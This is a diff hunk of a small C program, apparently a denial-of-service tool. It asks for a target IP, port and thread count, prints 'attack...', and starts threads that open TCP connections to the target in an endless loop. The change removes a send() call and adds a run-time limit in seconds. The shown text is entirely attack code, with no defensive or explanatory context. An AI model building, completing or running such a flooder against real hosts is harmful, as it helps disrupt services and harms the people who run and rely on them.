@@ -20,23 +20,27 @@ while(1){
 	if(inet_pton(AF_INET,ip,&serv_addr.sin_addr)<=0)
 		break;
 	connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
-	send(sock, req, 6,0);
+	
 	
 	}
 }
 int main()
 {
+int sec;
 printf("ip:");
 scanf("%s",ip);
 printf("port:");
 scanf("%d",&port);
 printf("threads:");
 scanf("%d",&threads);
+printf("time of program(sec):");
+scanf("%d",&sec);
 puts("attack...");
+
 size_t i;
 pthread_t t[threads];
    for(i=0;i<threads;i++)
 	pthread_create(&t[i],NULL,(void *)attack,NULL);
-pthread_join(t[0],NULL);
+sleep(sec);
 return 0;
 }
